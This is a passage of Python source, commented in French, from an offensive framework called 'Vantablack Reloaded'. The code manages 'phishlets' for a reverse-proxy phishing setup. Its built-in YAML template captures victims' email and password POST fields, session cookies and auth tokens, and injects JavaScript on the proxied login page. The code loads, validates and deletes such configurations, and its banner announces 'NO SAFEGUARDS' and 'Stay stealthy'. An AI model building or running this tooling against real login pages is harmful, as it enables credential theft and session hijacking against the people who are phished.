        valid_actions = {"list", "load", "validate", "delete", "templates"}
        if action not in valid_actions:
            return {"error": f"Action invalide: {action}",
                    "valid_actions": sorted(valid_actions)}

        base = Path(os.path.dirname(os.path.abspath(__file__)))
        ph_dir = base / "phishlets"

        # ---- templates : YAML minimaliste de référence ----
        if action == "templates":
            template = (
                "min_ver: '3.0.0'\n"
                "name: custom_target\n"
                "version: '1.0'\n"
                "description: 'Description du phishlet (interne)'\n"
                "base_domain: 'target.example.com'\n"
                "\n"
                "target_domains:\n"
                "  - login.target.example.com\n"
                "  - www.target.example.com\n"
                "\n"
                "proxy_hosts:\n"
                "  - phish_sub: 'login'\n"
                "    orig_sub:  'login'\n"
                "    domain:    'target.example.com'\n"
                "    session:   true\n"
                "    is_landing: true\n"
                "\n"
                "hosts:\n"
                "  - 'login.target.example.com'\n"
                "\n"
                "auth_urls:\n"
                "  - 'https://login.target.example.com/signin'\n"
                "  - 'https://login.target.example.com/oauth2/v2.0/authorize'\n"
                "\n"
                "auth_tokens:\n"
                "  - domain: '.target.example.com'\n"
                "    keys:   ['SESSION', 'AUTH_COOKIE', 'XSRF-TOKEN']\n"
                "\n"
                "js_inject:\n"
                "  - trigger: '/signin'\n"
                "    script: |\n"
                "      // JS injecté sur la page de login\n"
                "      console.log('[phishlet] loaded');\n"
                "\n"
                "credentials:\n"
                "  username:\n"
                "    key:    'email'\n"
                "    search: '(.*)'\n"
                "    type:   'post'\n"
                "  password:\n"
                "    key:    'password'\n"
                "    search: '(.*)'\n"
                "    type:   'post'\n"
                "\n"
                "login:\n"
                "  domain: 'login.target.example.com'\n"
                "  path:   '/signin'\n"
            )
            return {
                "status": "template",
                "name": "minimal",
                "required_fields": ["target_domains", "hosts", "auth_urls",
                                    "js_inject"],
                "yaml": template,
            }

        # ---- list : lister les .yaml / .yml du dossier phishlets ----
        if action == "list":
            files = sorted([
                p.name for p in ph_dir.iterdir()
                if p.is_file() and p.suffix.lower() in (".yaml", ".yml")
            ]) if ph_dir.exists() else []
            return {
                "count": len(files),
                "directory": str(ph_dir),
                "phishlets": files,
            }

        # Résolution du chemin cible (name OU path)
        target_path: Path | None = None
        if path:
            target_path = Path(path)
            if not target_path.is_absolute():
                target_path = base / target_path
        elif name:
            candidate = ph_dir / name
            if not candidate.suffix:
                candidate_yaml = candidate.with_suffix(".yaml")
                candidate_yml  = candidate.with_suffix(".yml")
                if candidate_yaml.exists():
                    target_path = candidate_yaml
                elif candidate_yml.exists():
                    target_path = candidate_yml
                else:
                    target_path = candidate_yaml
            else:
                target_path = candidate
        else:
            # Actions nécessitant un phishlet cible
            if action in ("load", "validate", "delete"):
                return {"error": f"name ou path requis pour action '{action}'"}

        # ---- validate : syntaxe YAML + champs requis ----
        required_fields = ("target_domains", "hosts", "auth_urls", "js_inject")
        if action == "validate":
            if target_path is None or not target_path.exists():
                return {"valid": False,
                        "error": f"Phishlet introuvable: {target_path}"}
            warnings: list[str] = []
            errors: list[str] = []
            content = None
            try:
                with target_path.open("r", encoding="utf-8") as f:
                    content = yaml.safe_load(f)
            except yaml.YAMLError as e:
                return {"valid": False,
                        "path": str(target_path),
                        "errors": [f"YAML syntax error: {e}"]}
            except Exception as e:
                return {"valid": False,
                        "path": str(target_path),
                        "errors": [f"Lecture échouée: {e}"]}
            if not isinstance(content, dict):
                return {"valid": False,
                        "path": str(target_path),
                        "errors": ["Contenu YAML invalide: racine doit être un mapping"]}
            for field in required_fields:
                if field not in content:
                    errors.append(f"Champ requis manquant: {field}")
            # Warnings : champs recommandés absents
            for recommended in ("name", "auth_tokens", "credentials",
                                "login", "proxy_hosts"):
                if recommended not in content:
                    warnings.append(f"Champ recommandé absent: {recommended}")
            return {
                "valid": len(errors) == 0,
                "path": str(target_path),
                "required_fields": list(required_fields),
                "errors": errors,
                "warnings": warnings,
            }

        # ---- load : charger et parser le YAML, retourner contenu + avertissements ----
        if action == "load":
            if target_path is None or not target_path.exists():
                return {"error": f"Phishlet introuvable: {target_path}",
                        "hint": "Utilisez 'list' pour voir les phishlets disponibles"}
            warnings: list[str] = []
            try:
                with target_path.open("r", encoding="utf-8") as f:
                    content = yaml.safe_load(f)
            except Exception as e:
                return {"error": f"Chargement échoué: {e}",
                        "path": str(target_path)}
            for field in required_fields:
                if not (isinstance(content, dict) and field in content):
                    warnings.append(f"Champ requis absent: {field}")
            self.active_phishlets = [p for p in self.active_phishlets
                                     if p.get("file") != target_path.name]
            if isinstance(content, dict):
                content["file"] = target_path.name
                content["path"] = str(target_path)
                self.active_phishlets.append(content)
            return {
                "status": "loaded",
                "path": str(target_path),
                "name": (content or {}).get("name", target_path.stem)
                        if isinstance(content, dict) else target_path.stem,
                "warnings": warnings,
                "content": content,
                "active_count": len(self.active_phishlets),
            }

        # ---- delete : supprimer le fichier (avec confirmation) ----
        if action == "delete":
            if target_path is None:
                return {"error": "name ou path requis pour action 'delete'"}
            if not target_path.exists():
                return {"error": f"Phishlet introuvable: {target_path}"}
            # Sécurité : on ne permet de supprimer que depuis le dossier phishlets/
            try:
                target_path.resolve().relative_to(ph_dir.resolve())
            except ValueError:
                return {"error": ("Suppression refusée : le fichier doit être "
                                  "dans le dossier phishlets/ "
                                  f"(path={target_path.resolve()})")}
            # Confirmation : demandée sauf si action="delete" et DELETE confirmé
            # via un flag d'environnement (pour usage API headless)
            confirm_ok = os.getenv("VANTABLACK_CONFIRM_DELETE", "0") == "1"
            if not confirm_ok:
                return {
                    "status": "confirmation_required",
                    "hint": ("Pour confirmer, re-passez action='delete' avec "
                             "la variable d'environnement "
                             "VANTABLACK_CONFIRM_DELETE=1"),
                    "target": str(target_path),
                }
            try:
                target_path.unlink()
            except Exception as e:
                return {"error": f"Suppression échouée: {e}",
                        "path": str(target_path)}
            # Retrait de la liste active si présent
            self.active_phishlets = [p for p in self.active_phishlets
                                     if p.get("file") != target_path.name]
            return {
                "status": "deleted",
                "path": str(target_path),
                "remaining_active": len(self.active_phishlets),
            }

        return {"error": "Action inconnue"}
    
    def system_info(self):
        """Display system information"""
        info_table = Table(show_header=False, box=box.SIMPLE)
        info_table.add_column("Component", style="cyan")
        info_table.add_column("Version", style="green")
        
        info_table.add_row("Python", sys.version.split()[0])
        info_table.add_row("Framework", "Vantablack Reloaded v2.0")
        info_table.add_row("Mode", "ROOT ACCESS - NO SAFEGUARDS")
        info_table.add_row("License", "Offensive Security Only")
        
        self.console.print(Panel(info_table, title="[bold]System Information[/bold]", border_style="green"))
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()
    
    def shutdown(self):
        """Clean shutdown"""
        self.console.print("[yellow]Shutting down Vantablack...[/yellow]")
        if self.proxy:
            self.proxy.stop()
        self.is_running = False
        self.console.print("[green]Shutdown complete. Stay stealthy.[/green]")
    
    def signal_handler(self, sig, frame):
        """Handle shutdown signals"""
        self.console.print("\n[yellow]Received shutdown signal...[/yellow]")
        self.shutdown()
        sys.exit(0)

def main():
    """Main entry point"""
    try:
        # Set up signal handlers
        signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
        signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
        
        # Create and run framework
        framework = VantablackReloaded()
        framework.display_main_menu()
        
    except KeyboardInterrupt:
        print("\nShutdown requested. Exiting...")
    except Exception as e:
        print(f"Critical error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()